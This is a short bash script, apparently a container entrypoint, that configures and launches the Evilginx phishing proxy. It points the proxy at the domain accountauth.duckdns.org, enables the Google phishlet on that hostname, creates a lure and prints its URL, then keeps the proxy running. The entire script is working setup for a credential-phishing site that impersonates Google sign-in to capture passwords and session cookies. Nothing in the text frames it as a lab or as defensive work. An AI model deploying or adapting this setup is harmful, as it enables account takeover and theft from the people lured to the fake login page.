#!/bin/bash

# Create a pseudo-terminal and run the configuration commands
script -q -c '/app/evilginx -p /app/phishlets' /dev/null <<EOF
config domain accountauth.duckdns.org
config ip 127.0.0.1
phishlets hostname google accountauth.duckdns.org
phishlets enable google
lures create google
lures get-url 0
exit
EOF

# After configuration, run Evilginx in the background to keep it alive
/app/evilginx -p /app/phishlets &
tail -f /dev/null
